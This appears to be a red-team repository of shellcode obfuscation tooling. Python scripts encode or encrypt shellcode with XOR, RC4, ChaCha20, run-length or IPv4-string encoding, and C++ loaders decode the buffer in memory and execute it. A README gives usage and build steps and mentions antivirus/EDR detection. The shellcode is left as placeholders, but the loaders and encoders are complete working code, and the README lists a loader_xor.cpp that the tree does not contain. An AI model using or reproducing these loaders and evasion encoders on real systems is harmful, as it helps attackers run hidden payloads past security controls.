@@ -1,0 +1,743 @@
+Project Path: arc_Hika-sec_PayloadLab_hdquhvgo
+
+Source Tree:
+
+```txt
+arc_Hika-sec_PayloadLab_hdquhvgo
+├── LICENSE
+├── Loaders
+│   ├── loader_chacha20.cpp
+│   ├── loader_ip.cpp
+│   ├── loader_rc4.cpp
+│   ├── loader_rle.cpp
+│   └── simple.cpp
+├── Obfuscators
+│   ├── chacha20_obfuscator.py
+│   ├── ip_hash_obfuscator.py
+│   ├── rc4_obfuscator.py
+│   ├── rle_obfuscator.py
+│   └── xor_obfuscator.py
+└── README.md
+
+```
+
+`LICENSE`:
+
+```
+MIT License
+
+Copyright (c) 2026 Hika
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+
+```
+
+`Loaders/loader_chacha20.cpp`:
+
+```cpp
+__attribute__((section(".text")))
+unsigned char buf[] = </*shellcode*/>;
+
+const unsigned int KEY[8] = {
+    0x03020100, 0x07060504, 0x0b0a0908, 0x0f0e0d0c,
+    0x13121110, 0x17161514, 0x1b1a1918, 0x1f1e1d1c
+};
+const unsigned int NONCE[3] = { 0x00000000, 0x4a000000, 0x00000000 };
+const unsigned int COUNTER = 1;
+
+unsigned int rotl32(unsigned int v, unsigned int c) {
+    return (v << c) | (v >> (32 - c));
+}
+
+void quarter_round(unsigned int x[16], unsigned int a, unsigned int b, unsigned int c, unsigned int d) {
+    x[a] += x[b]; x[d] ^= x[a]; x[d] = rotl32(x[d], 16);
+    x[c] += x[d]; x[b] ^= x[c]; x[b] = rotl32(x[b], 12);
+    x[a] += x[b]; x[d] ^= x[a]; x[d] = rotl32(x[d], 8);
+    x[c] += x[d]; x[b] ^= x[c]; x[b] = rotl32(x[b], 7);
+}
+
+void chacha20_block(unsigned int out[16], unsigned int counter) {
+    unsigned int state[16] = {
+        0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,
+        KEY[0], KEY[1], KEY[2], KEY[3],
+        KEY[4], KEY[5], KEY[6], KEY[7],
+        counter, NONCE[0], NONCE[1], NONCE[2]
+    };
+    unsigned int x[16];
+    for (int i = 0; i < 16; i++) x[i] = state[i];
+    for (int i = 0; i < 10; i++) {
+        quarter_round(x, 0, 4, 8, 12);
+        quarter_round(x, 1, 5, 9, 13);
+        quarter_round(x, 2, 6, 10, 14);
+        quarter_round(x, 3, 7, 11, 15);
+        quarter_round(x, 0, 5, 10, 15);
+        quarter_round(x, 1, 6, 11, 12);
+        quarter_round(x, 2, 7, 8, 13);
+        quarter_round(x, 3, 4, 9, 14);
+    }
+    for (int i = 0; i < 16; i++) out[i] = x[i] + state[i];
+}
+
+void chacha20_decrypt(unsigned char* data, unsigned int len) {
+    unsigned int stream[16];
+    unsigned int counter = COUNTER;
+    for (unsigned int i = 0; i < len; i += 64) {
+        chacha20_block(stream, counter++);
+        unsigned char* ks = (unsigned char*)stream;
+        unsigned int n = len - i;
+        if (n > 64) n = 64;
+        for (unsigned int j = 0; j < n; j++) {
+            data[i + j] ^= ks[j];
+        }
+    }
+}
+
+int main() {
+    chacha20_decrypt(buf, sizeof(buf) - 1);
+    (*(void(*)())(&buf))();
+    return 0;
+}
+```
+
+`Loaders/loader_ip.cpp`:
+
+```cpp
+__attribute__((section(".text")))
+const char* ip_table[] = { /* <ip list> */ };
+
+const unsigned int IP_COUNT = sizeof(ip_table) / sizeof(ip_table[0]);
+const unsigned int SHELLCODE_SIZE = 324;
+
+void ip_decode(unsigned char* out, unsigned int out_len) {
+    unsigned int idx = 0;
+    for (unsigned int i = 0; i < IP_COUNT && idx < out_len; i++) {
+        const char* p = ip_table[i];
+        unsigned int val = 0;
+        unsigned int oct = 0;
+        while (*p && oct < 4 && idx < out_len) {
+            if (*p >= '0' && *p <= '9') {
+                val = val * 10 + (unsigned int)(*p - '0');
+            } else if (*p == '.') {
+                out[idx++] = (unsigned char)val;
+                val = 0;
+                oct++;
+            }
+            p++;
+        }
+        if (oct < 4 && idx < out_len) {
+            out[idx++] = (unsigned char)val;
+        }
+    }
+}
+
+int main() {
+    static unsigned char buf[SHELLCODE_SIZE];
+    ip_decode(buf, SHELLCODE_SIZE);
+    (*(void(*)())(&buf))();
+    return 0;
+}
+```
+
+`Loaders/loader_rc4.cpp`:
+
+```cpp
+__attribute__((section(".text")))
+unsigned char buf[] = </*shellcode*/>;
+
+const unsigned char KEY[] = "\x73\x65\x63\x72\x65\x74";
+const unsigned int KEY_LEN = sizeof(KEY) - 1;
+
+void rc4_decrypt(unsigned char* data, unsigned int data_len, const unsigned char* key, unsigned int key_len) {
+    unsigned char s[256];
+    for (unsigned int i = 0; i < 256; i++) {
+        s[i] = (unsigned char)i;
+    }
+
+    unsigned int j = 0;
+    for (unsigned int i = 0; i < 256; i++) {
+        j = (j + s[i] + key[i % key_len]) % 256;
+        unsigned char tmp = s[i];
+        s[i] = s[j];
+        s[j] = tmp;
+    }
+
+    unsigned int i = 0;
+    j = 0;
+    for (unsigned int n = 0; n < data_len; n++) {
+        i = (i + 1) % 256;
+        j = (j + s[i]) % 256;
+        unsigned char tmp = s[i];
+        s[i] = s[j];
+        s[j] = tmp;
+        unsigned char k = s[(s[i] + s[j]) % 256];
+        data[n] ^= k;
+    }
+}
+
+int main() {
+    rc4_decrypt(buf, sizeof(buf), KEY, KEY_LEN);
+    (*(void(*)())(&buf))();
+    return 0;
+}
+```
+
+`Loaders/loader_rle.cpp`:
+
+```cpp
+__attribute__((section(".text")))
+unsigned char cmp[] = < /*shellcode*/>;
+
+const unsigned int CMP_SIZE = sizeof(cmp) - 1;
+const unsigned int ORIG_SIZE = 324;
+
+void rle_decompress(const unsigned char* src, unsigned int src_len, unsigned char* dst, unsigned int dst_len) {
+    unsigned int si = 0;
+    unsigned int di = 0;
+    while (si + 1 < src_len && di < dst_len) {
+        unsigned int count = src[si++];
+        unsigned char val = src[si++];
+        for (unsigned int i = 0; i < count && di < dst_len; i++) {
+            dst[di++] = val;
+        }
+    }
+}
+
+int main() {
+    static unsigned char buf[ORIG_SIZE];
+    rle_decompress(cmp, CMP_SIZE, buf, ORIG_SIZE);
+    (*(void(*)())(&buf))();
+    return 0;
+}
+```
+
+`Loaders/simple.cpp`:
+
+```cpp
+__attribute__((section(".text")))
+unsigned char buf[] = </*shellcode*/>;
+            
+
+int main()
+{
+    (*(void(*)())(&buf))();
+}
+```
+
+`Obfuscators/chacha20_obfuscator.py`:
+
+```py
+import os
+import sys
+import argparse
+import struct
+
+KEY = b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
+NONCE = b"\x00\x00\x00\x00\x00\x00\x00\x4a\x00\x00\x00\x00"
+
+
+def parse_args():
+    parser = argparse.ArgumentParser(description="ChaCha20 obfuscator for shellcode arrays")
+    parser.add_argument("-i", "--input", required=True, help="Input .txt file containing shellcode bytes")
+    return parser.parse_args()
+
+
+def read_shellcode(path):
+    with open(path, "r", encoding="utf-8") as f:
+        data = f.read()
+    for token in ('"', "\\x", "\\n", "\\r", "\\t", " ", "\n", "\r", "\t", ",", ";"):
+        data = data.replace(token, "")
+    if not data:
+        raise ValueError("No shellcode data found in input file")
+    try:
+        return bytes.fromhex(data)
+    except ValueError as e:
+        raise ValueError(f"Invalid hex data in input file: {e}")
+
+
+def rotl32(v, c):
+    return ((v << c) & 0xffffffff) | (v >> (32 - c))
+
+
+def quarter_round(x, a, b, c, d):
+    x[a] = (x[a] + x[b]) & 0xffffffff; x[d] ^= x[a]; x[d] = rotl32(x[d], 16)
+    x[c] = (x[c] + x[d]) & 0xffffffff; x[b] ^= x[c]; x[b] = rotl32(x[b], 12)
+    x[a] = (x[a] + x[b]) & 0xffffffff; x[d] ^= x[a]; x[d] = rotl32(x[d], 8)
+    x[c] = (x[c] + x[d]) & 0xffffffff; x[b] ^= x[c]; x[b] = rotl32(x[b], 7)
+
+
+def chacha20_block(key, counter, nonce):
+    state = [
+        0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,
+        struct.unpack_from("<I", key, 0)[0], struct.unpack_from("<I", key, 4)[0],
+        struct.unpack_from("<I", key, 8)[0], struct.unpack_from("<I", key, 12)[0],
+        struct.unpack_from("<I", key, 16)[0], struct.unpack_from("<I", key, 20)[0],
+        struct.unpack_from("<I", key, 24)[0], struct.unpack_from("<I", key, 28)[0],
+        counter,
+        struct.unpack_from("<I", nonce, 0)[0], struct.unpack_from("<I", nonce, 4)[0],
+        struct.unpack_from("<I", nonce, 8)[0],
+    ]
+    x = state[:]
+    for _ in range(10):
+        quarter_round(x, 0, 4, 8, 12)
+        quarter_round(x, 1, 5, 9, 13)
+        quarter_round(x, 2, 6, 10, 14)
+        quarter_round(x, 3, 7, 11, 15)
+        quarter_round(x, 0, 5, 10, 15)
+        quarter_round(x, 1, 6, 11, 12)
+        quarter_round(x, 2, 7, 8, 13)
+        quarter_round(x, 3, 4, 9, 14)
+    out = bytearray(64)
+    for i in range(16):
+        struct.pack_into("<I", out, i * 4, (x[i] + state[i]) & 0xffffffff)
+    return bytes(out)
+
+
+def chacha20_crypt(data, key, nonce, counter=1):
+    out = bytearray()
+    for i in range(0, len(data), 64):
+        block = chacha20_block(key, counter + (i // 64), nonce)
+        chunk = data[i:i + 64]
+        for j, b in enumerate(chunk):
+            out.append(b ^ block[j])
+    return bytes(out)
+
+
+def format_c(data):
+    chunks = []
+    for i in range(0, len(data), 16):
+        chunk = data[i:i + 16]
+        escaped = "".join(f"\\x{b:02x}" for b in chunk)
+        chunks.append(f'"{escaped}"')
+    return "\n".join(chunks)
+
+
+def main():
+    args = parse_args()
+
+    if not os.path.isfile(args.input):
+        print(f"[!] Input file not found: {args.input}")
+        sys.exit(1)
+
+    try:
+        shellcode = read_shellcode(args.input)
+    except ValueError as e:
+        print(f"[!] {e}")
+        sys.exit(1)
+
+    obfuscated = chacha20_crypt(shellcode, KEY, NONCE)
+
+    base, ext = os.path.splitext(args.input)
+    output_path = f"{base}_chacha20{ext or '.txt'}"
+
+    with open(output_path, "w", encoding="utf-8", newline="\n") as f:
+        f.write(format_c(obfuscated))
+
+    print(f"[+] Output file: {output_path}  ({os.path.getsize(output_path)} bytes)")
+    print(f"[+] Size before obfuscation: {len(shellcode)} bytes")
+    print(f"[+] Size after  obfuscation: {len(obfuscated)} bytes")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+`Obfuscators/ip_hash_obfuscator.py`:
+
+```py
+import os
+import sys
+import argparse
+
+
+def parse_args():
+    parser = argparse.ArgumentParser(description="IP hashing obfuscator for shellcode arrays")
+    parser.add_argument("-i", "--input", required=True, help="Input .txt file containing shellcode bytes")
+    return parser.parse_args()
+
+
+def read_shellcode(path):
+    with open(path, "r", encoding="utf-8") as f:
+        data = f.read()
+    for token in ('"', "\\x", "\\n", "\\r", "\\t", " ", "\n", "\r", "\t", ",", ";"):
+        data = data.replace(token, "")
+    if not data:
+        raise ValueError("No shellcode data found in input file")
+    try:
+        return bytes.fromhex(data)
+    except ValueError as e:
+        raise ValueError(f"Invalid hex data in input file: {e}")
+
+
+def to_ipv4_strings(data):
+    padded = bytearray(data)
+    pad_len = (-len(padded)) % 4
+    if pad_len:
+        padded.extend(b"\x00" * pad_len)
+    ips = []
+    for i in range(0, len(padded), 4):
+        chunk = padded[i:i + 4]
+        ips.append(f"{chunk[0]}.{chunk[1]}.{chunk[2]}.{chunk[3]}")
+    return ips, pad_len
+
+
+def format_c(ips):
+    lines = []
+    for i, ip in enumerate(ips):
+        suffix = "," if i < len(ips) - 1 else ""
+        lines.append(f'"{ip}"{suffix}')
+    return "\n".join(lines)
+
+
+def main():
+    args = parse_args()
+
+    if not os.path.isfile(args.input):
+        print(f"[!] Input file not found: {args.input}")
+        sys.exit(1)
+
+    try:
+        shellcode = read_shellcode(args.input)
+    except ValueError as e:
+        print(f"[!] {e}")
+        sys.exit(1)
+
+    ips, pad_len = to_ipv4_strings(shellcode)
+
+    base, ext = os.path.splitext(args.input)
+    output_path = f"{base}_ip{ext or '.txt'}"
+
+    with open(output_path, "w", encoding="utf-8", newline="\n") as f:
+        f.write(format_c(ips))
+
+    print(f"[+] Output file: {output_path}  ({os.path.getsize(output_path)} bytes)")
+    print(f"[+] Size before obfuscation: {len(shellcode)} bytes")
+    print(f"[+] IPv4 entries: {len(ips)} (padded {pad_len} bytes)")
+    print(f"[+] Size after  obfuscation: {len(ips) * 4} bytes")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+`Obfuscators/rc4_obfuscator.py`:
+
+```py
+import os
+import sys
+import argparse
+
+KEY = b"\x73\x65\x63\x72\x65\x74"
+
+
+def parse_args():
+    parser = argparse.ArgumentParser(description="RC4 obfuscator for shellcode arrays")
+    parser.add_argument("-i", "--input", required=True, help="Input .txt file containing shellcode bytes")
+    return parser.parse_args()
+
+
+def read_shellcode(path):
+    with open(path, "r", encoding="utf-8") as f:
+        data = f.read()
+    for token in ('"', "\\x", "\\n", "\\r", "\\t", " ", "\n", "\r", "\t", ",", ";"):
+        data = data.replace(token, "")
+    if not data:
+        raise ValueError("No shellcode data found in input file")
+    try:
+        return bytes.fromhex(data)
+    except ValueError as e:
+        raise ValueError(f"Invalid hex data in input file: {e}")
+
+
+def rc4_crypt(data, key):
+    if not key:
+        raise ValueError("RC4 key must not be empty")
+    s = list(range(256))
+    j = 0
+    key_bytes = key if isinstance(key, (bytes, bytearray)) else key.encode("utf-8")
+
+    for i in range(256):
+        j = (j + s[i] + key_bytes[i % len(key_bytes)]) % 256
+        s[i], s[j] = s[j], s[i]
+
+    i = 0
+    j = 0
+    out = bytearray()
+    for byte in data:
+        i = (i + 1) % 256
+        j = (j + s[i]) % 256
+        s[i], s[j] = s[j], s[i]
+        k = s[(s[i] + s[j]) % 256]
+        out.append(byte ^ k)
+    return bytes(out)
+
+
+def format_c(data):
+    chunks = []
+    for i in range(0, len(data), 16):
+        chunk = data[i:i + 16]
+        escaped = "".join(f"\\x{b:02x}" for b in chunk)
+        chunks.append(f'"{escaped}"')
+    return "\n".join(chunks)
+
+
+def main():
+    args = parse_args()
+
+    if not os.path.isfile(args.input):
+        print(f"[!] Input file not found: {args.input}")
+        sys.exit(1)
+
+    try:
+        shellcode = read_shellcode(args.input)
+    except ValueError as e:
+        print(f"[!] {e}")
+        sys.exit(1)
+
+    obfuscated = rc4_crypt(shellcode, KEY)
+
+    base, ext = os.path.splitext(args.input)
+    output_path = f"{base}_rc4{ext or '.txt'}"
+
+    with open(output_path, "w", encoding="utf-8", newline="\n") as f:
+        f.write(format_c(obfuscated))
+
+    print(f"[+] Output file: {output_path}  ({os.path.getsize(output_path)} bytes)")
+    print(f"[+] Size before obfuscation: {len(shellcode)} bytes")
+    print(f"[+] Size after  obfuscation: {len(obfuscated)} bytes")
+
+
+if __name__ == "__main__":
+    main()
+
+```
+
+`Obfuscators/rle_obfuscator.py`:
+
+```py
+import os
+import sys
+import argparse
+
+
+def parse_args():
+    parser = argparse.ArgumentParser(description="RLE obfuscator for shellcode arrays")
+    parser.add_argument("-i", "--input", required=True, help="Input .txt file containing shellcode bytes")
+    return parser.parse_args()
+
+
+def read_shellcode(path):
+    with open(path, "r", encoding="utf-8") as f:
+        data = f.read()
+    for token in ('"', "\\x", "\\n", "\\r", "\\t", " ", "\n", "\r", "\t", ",", ";"):
+        data = data.replace(token, "")
+    if not data:
+        raise ValueError("No shellcode data found in input file")
+    try:
+        return bytes.fromhex(data)
+    except ValueError as e:
+        raise ValueError(f"Invalid hex data in input file: {e}")
+
+
+def rle_compress(data):
+    out = bytearray()
+    i = 0
+    n = len(data)
+    while i < n:
+        j = i + 1
+        while j < n and data[j] == data[i] and (j - i) < 255:
+            j += 1
+        out.append(j - i)
+        out.append(data[i])
+        i = j
+    return bytes(out)
+
+
+def format_c(data):
+    chunks = []
+    for i in range(0, len(data), 16):
+        chunk = data[i:i + 16]
+        escaped = "".join(f"\\x{b:02x}" for b in chunk)
+        chunks.append(f'"{escaped}"')
+    return "\n".join(chunks)
+
+
+def main():
+    args = parse_args()
+
+    if not os.path.isfile(args.input):
+        print(f"[!] Input file not found: {args.input}")
+        sys.exit(1)
+
+    try:
+        shellcode = read_shellcode(args.input)
+    except ValueError as e:
+        print(f"[!] {e}")
+        sys.exit(1)
+
+    compressed = rle_compress(shellcode)
+
+    base, ext = os.path.splitext(args.input)
+    output_path = f"{base}_rle{ext or '.txt'}"
+
+    with open(output_path, "w", encoding="utf-8", newline="\n") as f:
+        f.write(format_c(compressed))
+
+    print(f"[+] Output file: {output_path}  ({os.path.getsize(output_path)} bytes)")
+    print(f"[+] Size before compression: {len(shellcode)} bytes")
+    print(f"[+] Size after  compression: {len(compressed)} bytes")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+`Obfuscators/xor_obfuscator.py`:
+
+```py
+import os
+import sys
+import argparse
+XOR_KEY = 0x41
+
+def parse_args():
+    parser = argparse.ArgumentParser(description="XOR Obfuscator for shellcode arrays")
+    parser.add_argument("-i", "--input", required=True, help="Input .txt file containing shellcode bytes")
+    return parser.parse_args()
+
+def read_shellcode(path):
+    with open(path, "r") as f:
+        data = f.read()
+    data = data.replace('"', "").replace("\\x", "").replace("\\n", "").replace("\\r", "").replace("\\t", "")
+    data = data.replace(" ", "").replace("\n", "").replace("\r", "").replace("\t", "")
+    if not data:
+        raise ValueError("No shellcode data found in input file")
+    try:
+        return bytes.fromhex(data)
+    except ValueError as e:
+        raise ValueError(f"Invalid hex data in input file: {e}")
+
+def xor_obfuscate(data, key):
+    return bytes(b ^ (key & 0xFF) for b in data)
+
+def format_c(data):
+    chunks = []
+    for i in range(0, len(data), 16):
+        chunk = data[i:i+16]
+        escaped = "".join(f"\\x{b:02x}" for b in chunk)
+        chunks.append(f'"{escaped}"')
+    return "\n".join(chunks)
+
+def main():
+    args = parse_args()
+
+    if not os.path.isfile(args.input):
+        print(f"[!] Input file not found: {args.input}")
+        sys.exit(1)
+
+    try:
+        shellcode = read_shellcode(args.input)
+    except ValueError as e:
+        print(f"[!] {e}")
+        sys.exit(1)
+
+    base, ext = os.path.splitext(args.input)
+    output_path = f"{base}_obfuscated{ext or '.txt'}"
+
+    obfuscated = xor_obfuscate(shellcode, XOR_KEY)
+
+    with open(output_path, "w") as f:
+        f.write(format_c(obfuscated))
+
+    print(f"[+] Output file: {output_path}  ({os.path.getsize(output_path)} bytes)")
+    print(f"[+] XOR key:     0x{XOR_KEY:02x}")
+    print(f"[+] Size before obfuscation: {len(shellcode)} bytes")
+    print(f"[+] Size after  obfuscation: {len(obfuscated)} bytes")
+
+if __name__ == "__main__":
+    main()
+```
+
+`README.md`:
+
+```md
+# Payload Obfuscation Research (Red Team)
+
+This repository/folder contains small experiments created as part of **Red Team research into payload obfuscation techniques**. It includes simple obfuscators (Python) and corresponding loaders (C/C++) that transform, encode, or encrypt a shellcode payload and reconstruct/execute it in memory.
+
+> **Disclaimer:** For educational purposes and **authorized security research / lab environments only**. Do not use against systems without explicit permission. The code executes raw shellcode and may be detected or blocked by security controls.
+
+## Contents
+
+| Component | Files | Description |
+|---|---|---|
+| Original sample | `simple.cpp` | Source/escaped-byte form of the x86 shellcode sample used for experiments. |
+| XOR | `xor_obfuscator.py`, `loader_xor.cpp` | Single-byte XOR obfuscation (key `0x41`). Loader XOR-decodes in place and transfers control to the buffer. |
+| RC4 | `rc4_obfuscator.py`, `loader_rc4.cpp` | RC4 stream obfuscation with a fixed embedded `KEY`. Loader performs RC4 KSA/PRGA decrypt and executes the buffer. |
+| IP encoding | `ip_hash_obfuscator.py`, `loader_ip.cpp` | Encodes payload bytes as IPv4 dotted strings (4 bytes per address, zero-padded if needed). Loader parses and reconstructs bytes (IPfuscation-style encoding, not cryptographic hashing). |
+| RLE | `rle_obfuscator.py`, `loader_rle.cpp` | Simple run-length encoding with `[count][byte]` pairs (`count` 1..255). Loader decodes into a fixed-size buffer and executes it. |
+| ChaCha20 | `chacha20_obfuscator.py`, `loader_chacha20.cpp` | ChaCha20 stream cipher obfuscation (IETF/RFC 8439-style state: 32-bit counter, 96-bit nonce, 20 rounds) with fixed embedded `KEY`/`NONCE`/`COUNTER`. Loader generates keystream, XOR-decrypts, and executes. |
+
+
+## Obfuscators (Python)
+
+- **Input:** `-i/--input <file>` containing shellcode as C-style escaped bytes (e.g. `"\xfc\xe8..."` / `\xHH`). Parsers strip quotes, `\x`, whitespace, commas/semicolons as needed.
+- **Output:** written automatically next to the input as `<basename>_<method><ext>` and basic stats are printed (sizes/counts). No custom output-path argument.
+- **Usage examples:**
+
+```bash
+python xor_obfuscator.py -i shellcode.txt        # -> shellcode_obfuscated.txt
+python rc4_obfuscator.py -i shellcode.txt        # -> shellcode_rc4.txt
+python ip_hash_obfuscator.py -i shellcode.txt    # -> shellcode_ip.txt
+python rle_obfuscator.py -i shellcode.txt        # -> shellcode_rle.txt
+python chacha20_obfuscator.py -i shellcode.txt   # -> shellcode_chacha20.txt
+```
+
+## Loaders (C/C++)
+
+Each loader embeds the transformed payload (and constants/keys where applicable), reconstructs/decrypts it at runtime, and jumps to the buffer:
+
+```c
+(*(void(*)())(&buf))();
+```
+
+- **Build (example, MinGW/g++):**
+
+```bash
+g++ -O2 -o loader_xor.exe loader_xor.cpp
+g++ -O2 -o loader_rc4.exe loader_rc4.cpp
+g++ -O2 -o loader_ip.exe loader_ip.cpp
+g++ -O2 -o loader_rle.exe loader_rle.cpp
+g++ -O2 -o loader_chacha20.exe loader_chacha20.cpp
+```
+
+- **Architecture:** the sample shellcode is x86 (32-bit). Build and run with a matching architecture/OS.
+
+## Notes & Limitations
+
+- **Execution/memory:** loaders decode/decrypt and execute from their buffers without explicitly setting executable/writable memory protections (e.g. no `VirtualProtect`/RWX allocation). Depending on compiler, section placement (`.text`), and OS mitigations (DEP/NX), execution may fail or crash.
+- **Payload behavior:** the sample payload may produce no console output and can depend on external conditions; a silent exit is not proof of success or failure.
+- **RLE efficiency:** pairwise RLE expands data without runs (the sample grows from 324 to 614 bytes); it is included as a simple compression/encoding protocol example.
+- **Security properties:** encodings (IP) and simple transforms (XOR/RLE) provide minimal resistance to analysis; RC4/ChaCha20 are used here with fixed embedded parameters for research/demonstration, not as a complete protection scheme.
+- **Detection:** these are well-known patterns and may be flagged by EDR/AV; intended for controlled research and detection/analysis study.
+
+## Purpose
+
+Created to study and compare basic payload transformation, encoding, compression, and encryption/decryption flows (obfuscator ↔ loader) in a Red Team research context.
+
+```
